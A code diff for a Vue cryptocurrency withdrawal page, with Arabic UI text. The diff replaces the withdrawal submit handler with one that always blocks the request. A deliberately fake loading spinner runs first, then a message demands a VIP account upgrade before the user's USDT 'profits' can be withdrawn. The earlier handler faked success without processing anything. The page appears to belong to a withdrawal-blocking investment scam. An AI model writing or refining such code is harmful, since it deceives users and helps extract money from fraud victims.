@@ -193,17 +193,28 @@
       <!-- زر السحب -->
       <button 
         class="gold-button" 
-        @click="submitWithdraw"
-        :disabled="isLoading || !isFormValid"
+        @click="showWithdrawRestriction"
+        :disabled="isLoading"
       >
         <i class="fas fa-paper-plane" v-if="!isLoading"></i>
         <i class="fas fa-spinner fa-spin" v-else></i>
         {{ isLoading ? 'جاري المعالجة...' : 'تأكيد السحب' }}
       </button>
 
-      <!-- رسائل الخطأ -->
+      <!-- رسالة المنع -->
       <transition name="fade">
-        <div v-if="message" class="message" :class="messageType">
+        <div v-if="showRestrictionMessage" class="message error restriction-message">
+          <i class="fas fa-exclamation-triangle"></i>
+          <div>
+            <div class="message-title">⚠️ يجب ترقية حسابك إلى VIP أعلى حتى تتمكن من سحب الأرباح.</div>
+            <div class="message-amount">المبلغ المطلوب سحبه: <strong>{{ (Number(amount) || 0).toFixed(2) }} USDT</strong></div>
+          </div>
+        </div>
+      </transition>
+
+      <!-- رسائل أخرى -->
+      <transition name="fade">
+        <div v-if="message && !showRestrictionMessage" class="message" :class="messageType">
           <i :class="messageType === 'error' ? 'fas fa-exclamation-circle' : 'fas fa-check-circle'"></i>
           {{ message }}
         </div>
@@ -231,6 +242,7 @@ export default {
       message: "",
       messageType: "info",
       showNetworkDropdown: false,
+      showRestrictionMessage: false,
       networks: [
         { value: 'TRC20', label: 'Tron (TRC20)' },
         { value: 'ERC20', label: 'Ethereum (ERC20)' },
@@ -426,18 +438,23 @@ export default {
       }, 5000);
     },
 
-    submitWithdraw() {
-      if (!this.isFormValid) return;
+    showWithdrawRestriction() {
+      // إخفاء أي رسائل أخرى
+      this.message = "";
       
-      // عرض رسالة نجاح مؤقتة أو معالجة السحب
+      // إظهار رسالة المنع فقط
+      this.showRestrictionMessage = true;
+      
+      // إضافة تأثير تحميل وهمي
       this.isLoading = true;
       setTimeout(() => {
         this.isLoading = false;
-        this.showMessage("تم استلام طلب السحب بنجاح، سيتم مراجعته قريباً", "success");
-        // إعادة تعيين الحقول
-        this.amount = "";
-        this.password = "";
-      }, 1500);
+      }, 500);
+      
+      // إخفاء الرسالة بعد 5 ثواني
+      setTimeout(() => {
+        this.showRestrictionMessage = false;
+      }, 5000);
     }
   }
 };
@@ -572,6 +589,34 @@ export default {
   background: rgba(16, 185, 129, 0.15);
   color: #86efac;
   border: 1px solid rgba(16, 185, 129, 0.3);
+}
+
+/* رسالة المنع المخصصة */
+.restriction-message {
+  background: rgba(220, 38, 38, 0.2);
+  border: 1px solid rgba(220, 38, 38, 0.5);
+  padding: 16px;
+}
+
+.restriction-message i {
+  font-size: 24px;
+  color: #fca5a5;
+}
+
+.message-title {
+  font-size: 14px;
+  font-weight: 700;
+  margin-bottom: 6px;
+}
+
+.message-amount {
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.message-amount strong {
+  color: #fcd535;
+  font-size: 14px;
 }
 
 /* مجموعات الإدخال */
